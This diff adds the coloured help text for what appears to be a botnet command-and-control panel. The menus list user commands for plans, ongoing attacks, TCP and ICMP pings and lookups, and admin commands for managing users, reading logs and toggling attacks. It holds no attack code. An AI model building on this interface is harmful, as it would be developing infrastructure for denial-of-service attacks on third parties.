@@ -1,0 +1,23 @@
+
+ [97m [38;2;80;178;255m[ Help ]
+
+   [38;2;0;143;255m• [37;1mplan[38;2;0;143;255m: [0m[37;3mshows info about plan
+   [38;2;0;143;255m• [37;1mpasswd[38;2;0;143;255m: [0m[37;3mchanges password for your account
+   [38;2;0;143;255m• [37;1mongoing[38;2;0;143;255m: [0m[37;3mshows ongoing attacks
+   [38;2;0;143;255m• [37;1mclear[38;2;0;143;255m: [0m[37;3mclears terminal
+   [38;2;0;143;255m• [37;1mcredits[38;2;0;143;255m: [0m[37;3mcnc credits
+   [38;2;0;143;255m• [37;1mpaping[38;2;0;143;255m: [0m[37;3mTCP ping another ip
+   [38;2;0;143;255m• [37;1mping[38;2;0;143;255m: [0m[37;3mICMP ping another ip
+   [38;2;0;143;255m• [37;1mlookup[38;2;0;143;255m: [0m[37;3mlookup url/ip
+  
+ [97m [38;2;80;178;255m[ Help Admin ]
+
+   [38;2;0;143;255m• [37;1mcheckuser [username][38;2;0;143;255m: [0m[37;3mshows info about user's plan
+   [38;2;0;143;255m• [37;1musers [/add/delete/count][38;2;0;143;255m: [0m[37;3mdisplay lists of users or allows to manage users
+   [38;2;0;143;255m• [37;1medituser [username][38;2;0;143;255m: [0m[37;3mpanel to edit user's settings
+   [38;2;0;143;255m• [37;1mlogs [page number/clear][38;2;0;143;255m: [0m[37;3mdisplay logs
+   [38;2;0;143;255m• [37;1mtoggle [attacks][38;2;0;143;255m: [0m[37;3mallows to toggle attacks
+   [38;2;0;143;255m• [37;1monline[38;2;0;143;255m: [0m[37;3mdisplays list of online users
+   [38;2;0;143;255m• [37;1mannounce [message][38;2;0;143;255m: [0m[37;3msends message to all users
+   [38;2;0;143;255m• [37;1mreload[38;2;0;143;255m: [0m[37;3mreloads config
+   
